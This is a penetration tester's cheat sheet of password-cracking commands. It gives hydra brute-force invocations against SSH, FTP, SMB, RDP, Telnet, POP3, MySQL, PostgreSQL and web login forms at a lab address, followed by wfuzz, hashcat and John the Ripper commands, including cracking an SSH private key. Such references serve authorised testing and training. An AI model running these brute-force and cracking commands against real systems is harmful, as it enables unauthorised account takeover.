# Cracking Techniques

Usually the tools that I always use are hashcat, wfuzz, hydra and metasploit. 

- [SSH](#ssh)
- [FTP](#ftp)
- [SMB](#smb)
- [RDP](#rdp)
- [Telnet](#rdp)
- [Pop3](#pop3)
- [Mysql](#mysql)
- [Postgresql](#postgresql)
- [HTTP](#http)
- [Hashcat](#hashcat)
- [John](#john)
- [References](#references)

### SSH

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 ssh 

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 ssh 

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 ssh

# Different Port 
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 ssh -s 9999
```

### FTP

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 ftp

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 ftp 

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 ftp

# Different Port 
hydra  -l user -P /opt/rockyou.txt -f 10.10.8.83 ftp -s 9999
```

### SMB

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 smb

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 smb 

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 smb

# With Domain
hydra -l user -P /opt/rockyou.txt -f -m Domain 10.10.8.83 smb 

```

### RDP

```
# Unknown User
hydra -L user.txt -p "Password" -f rdp://10.10.8.83

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f rdp://10.10.8.83

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f rdp://10.10.8.83
```

### Telnet

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 telnet

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 telnet

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 telnet

# Different Port
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 telnet -s 9999
```

### Pop3

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 pop3

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 pop3

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 pop3

# Different Port
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 pop3 -s 9999
```

### Mysql

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 mysql

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 mysql

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 mysql

# Different Port
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 mysql -s 9999
```

### Postgresql

```
# Unknown User
hydra -L user.txt -p "Password" -f 10.10.8.83 postgres 

# Unknown Password
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 postgres 

# Unknown User and Password
hydra -L user.txt -P /opt/rockyou.txt -f 10.10.8.83 postgres 

# Different Port
hydra -l user -P /opt/rockyou.txt -f 10.10.8.83 postgres -s 9999
```

### HTTP

```
=> Hydra

# Unknown User
hydra -f -L user.txt -P /opt/rockyou.txt 10.10.8.83 http-post-form "/api/login:username=^USER^&password=^PASS^&Login=Login:Incorrect Credentials" -t 50

# Unknown Password
hydra -f -l user -P /opt/rockyou.txt 10.10.8.83 http-post-form "/api/login:username=^USER^&password=^PASS^&Login=Login:Incorrect Credentials" -t 50

# Unknown User and Password
hydra -f -L user.txt -P /opt/rockyou.txt 10.10.8.83 http-post-form "/api/login:username=^USER^&password=^PASS^&Login=Login:Incorrect Credentials" -t 50

=> Wfuzz

# Basic Authentication
wfuzz -u http://10.10.8.83 -H "Authorization : Basic FUZZ" -w userpass.txt --h459

wfuzz -w user.txt -w pass.txt --basic FUZZ:FUZ2Z http://10.10.8.83
```


### Hashcat

Please check the mode in the link below:

https://hashcat.net/wiki/doku.php?id=example_hashes

```
hashcat -m 160 crack.txt /opt/rockyou.txt

hashcat -m 160 crack.txt /opt/rockyou.txt --force
```

### John

Usually the john is already inside Kali VM. You can locate it in /usr/share/john/.

```
# Find List of John 
locate john | grep /usr/share/john/ | grep 2 | grep -v "ztex" | grep -v "rules"

# Convert to John (Example)
python /usr/share/john/ssh2john.py id_rsa > hash.txt

# To crack
john --wordlist=/opt/rockyou.txt hash.txt

john hash.txt --format=RAW-MD5 --wordlist=/opt/word/rockyou.txt

```

# References

[1] https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux

[2] https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/

[3] https://medium.com/better-programming/can-we-automate-earning-bug-bounties-with-wfuzz-c4e7a96810a5

[4] https://hashcat.net

[5] http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats